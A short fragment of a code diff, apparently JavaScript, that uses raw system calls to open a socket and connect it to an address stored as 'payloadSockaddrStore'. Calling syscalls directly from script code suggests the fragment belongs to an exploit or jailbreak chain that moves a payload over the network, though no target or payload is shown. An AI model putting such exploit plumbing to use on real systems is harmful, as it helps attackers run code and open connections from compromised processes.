+        const opened = await sys(SYS_SOCKET, 2, 1, 0);
+        if (opened.failed || opened.s32 < 0) return false;
+        fd = opened.s32;
+        track(fd);
+        const connected = await sys(SYS_CONNECT, fd, payloadSockaddrStore.ptr, 0x10);
